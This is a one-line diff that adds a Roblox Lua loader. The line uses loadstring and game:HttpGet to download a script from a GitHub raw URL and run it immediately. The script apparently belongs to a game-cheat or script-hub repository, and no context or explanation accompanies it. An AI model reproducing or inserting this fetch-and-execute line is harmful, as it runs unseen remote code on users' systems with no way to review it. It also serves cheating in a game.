@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/horneldersever24/loaders/main/loaders/room-13-horror-spam7-i6z8yvuboe9udx.lua"))()
